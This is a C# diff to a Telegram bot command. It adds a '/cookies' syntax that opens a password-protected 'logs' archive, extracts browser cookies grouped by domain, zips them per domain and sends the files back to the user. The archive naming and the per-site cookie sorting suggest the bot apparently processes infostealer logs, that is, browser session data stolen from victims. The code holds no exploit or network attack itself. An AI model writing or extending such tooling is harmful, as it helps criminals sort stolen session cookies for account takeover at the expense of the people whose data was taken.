@@ -11,9 +11,21 @@ namespace TelegramBot.Commands.Main;
 public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService data, Random random) : ICommand
 {
     public bool AuthorizedOnly { get; } = true;
-    
+
+    private static readonly Regex _args = new("/cookies \"(.*?)\"( \"(.*?)\")?");
     public Task Invoke(UpdateNewMessage update, User user)
     {
+        if (update.message is Message msg)
+            if (msg.message.StartsWith("/cookies"))
+            {
+                var args = _args.Match(msg.message);
+                var archivepath = data.GetLogsPath(args.Groups[1].Value);
+
+                if (archivepath is null) return client.Messages_SendMessage(user, $"Archive {args.Groups[1].Value} doesn't exists", random.NextInt64());
+
+                return ProcessArchive(user, archivepath, args.Groups[3].Success ? args.Groups[3].Value : null);
+            }
+        
         App.Default.Add(update.message.Peer.ID, HandleCookiesAsync);
 
         return client.Messages_SendMessage(
@@ -30,27 +42,32 @@ public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService d
         
         if (filepath is null) return;
 
+        await ProcessArchive(user, filepath, GetPassword(((Message) update.message).message));
+    }
+
+    private async Task ProcessArchive(InputPeer peer, string filepath, string? password)
+    {
         //  extracting
-        if (await data.ExtractFilesAsync(user, filepath, GetPassword(((Message) update.message).message)) is not {} dir) return;
-        
+        if (await data.ExtractFilesAsync(peer, filepath, password) is not { } dir) return;
+
         // parsing
         var filename = filepath[(filepath.LastIndexOf('\\') + 1)..filepath.LastIndexOf('.')];
-        
-        await client.Messages_SendMessage(user, $"Start parsing cookies from {filename}", random.NextInt64());
-        
-        foreach (var (domain, cookies) in cfgParse.Cookies.CookiesFromLogs(dir))
+
+        await client.Messages_SendMessage(peer, $"Start parsing cookies from {filename}", random.NextInt64());
+
+        foreach (var (cookie, cookies) in cfgParse.Cookies.CookiesFromLogs(dir))
         {
             var path = await data.SaveZipAsync(
-                dir[(dir.LastIndexOf('\\')+1)..],
+                dir[(dir.LastIndexOf('\\') + 1)..],
                 "cookies",
-                domain,
+                cookie.Domains.First(),
                 cookies.ToArray(),
                 name: "Cookies");
 
-            await data.SendFileAsync(user, path);
+            await data.SendFileAsync(peer, path);
         }
-        
-        await client.Messages_SendMessage(user, $"{filename} successfully processed", random.NextInt64());
+
+        await client.Messages_SendMessage(peer, $"{filename} successfully processed", random.NextInt64());
     }
 
     private static readonly Regex _password = new(@"(P|p)?ass(word)?.?[a-zA-Z0-9]*?\s?(:|-)?\s?(.+)($|\n)");
